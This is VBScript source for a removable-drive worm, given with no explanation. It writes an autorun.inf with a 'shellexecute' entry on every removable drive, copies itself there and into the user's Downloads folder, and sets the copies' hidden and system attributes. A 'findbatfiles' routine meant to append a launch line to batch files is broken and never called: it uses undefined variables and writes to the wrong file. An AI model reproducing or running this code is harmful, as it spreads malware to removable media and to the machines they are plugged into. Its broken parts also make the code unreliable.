Set FSO = CreateObject("Scripting.FileSystemObject")
Set colDrives = FSO.Drives
Dim fileName
Const ForReading = 1, ForWriting = 2, ForAppending = 8, properties = 6
For Each drive in colDrives
	If drive.DriveType = 1 Then
		fileName = (drive.DriveLetter & ":\autorun.inf")
		If FSO.FileExists(fileName) = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.Close
		End If
		If FSO.GetFile(fileName).Size = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.WriteLine("[AutoRun]")
			targetFile.Close
		End If
		Set targetFile = FSO.OpenTextFile(fileName, ForAppending)
		Set pattern = New RegExp
		pattern.IgnoreCase = False
		pattern.Global = True
		pattern.Pattern = "\[AutoRun\]"
		If pattern.Test(FSO.OpenTextFile(fileName).ReadAll) = False Then
			targetFile.WriteLine("[AutoRun]")
		End If
		targetFile.WriteLine("shellexecute=" & chr(34) & Wscript.ScriptName & chr(34))
		targetFile.Close
		If FSO.FileExists(drive.DriveLetter & ":\" & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, drive.DriveLetter & ":\"
			Set mapFile = FSO.GetFile(drive.DriveLetter & ":\" & Wscript.ScriptName)
			mapFile.Attributes = properties
		End If
		Set mapFile = FSO.GetFile(drive.DriveLetter & ":\autorun.inf")
		mapFile.Attributes = properties
	End If
Next
Dim searchtarget, SubFolder, downloadsdir
downloadsdir = "C:\Users\" & CreateObject( "WScript.Shell" ).ExpandEnvironmentStrings( "%USERNAME%" ) & "\Downloads\"
If FSO.FileExists(downloadsdir & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, downloadsdir
			Set mapFile = FSO.GetFile(downloadsdir & Wscript.ScriptName)
			mapFile.Attributes = properties
End If
Sub findbatfiles
	For Each searchtarget In objFolder.Files
		If LCase(FSO.GetExtensionName(searchtarget.Name)) = "bat" Then
            FSO.OpenTextFile(fileName, ForAppending).WriteLine( "cscript.exe" & downloadsdir & Wscript.ScriptName )
		End If
	Next
	For Each SubFolder In Folder.SubFolders
        findbatfiles SubFolder
	Next
End Sub
